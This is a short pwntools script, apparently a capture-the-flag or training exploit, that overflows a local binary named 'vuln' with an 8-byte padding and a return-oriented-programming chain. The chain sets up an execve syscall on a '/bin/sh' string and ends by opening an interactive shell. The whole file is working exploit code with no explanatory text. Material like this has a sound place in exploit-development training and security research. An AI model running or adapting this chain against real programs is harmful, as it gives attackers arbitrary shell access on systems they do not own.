#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

binsh = elf.address + 0x1250

POP_RAX = next(elf.search(asm('pop rax; ret')))
POP_RDI = next(elf.search(asm('pop rdi; ret')))
POP_RSI = next(elf.search(asm('pop rsi; ret')))
POP_RDX = next(elf.search(asm('pop rdx; ret')))
SYSCALL = next(elf.search(asm('syscall; ret')))

offset = 8

payload = flat(
    b'A' * offset,
    POP_RAX,
    0x3b,
    POP_RDI,
    binsh,
    POP_RSI,
    0x0,
    POP_RDX,
    0x0,
    SYSCALL
)

print(payload)

p.sendline(payload)
p.interactive()
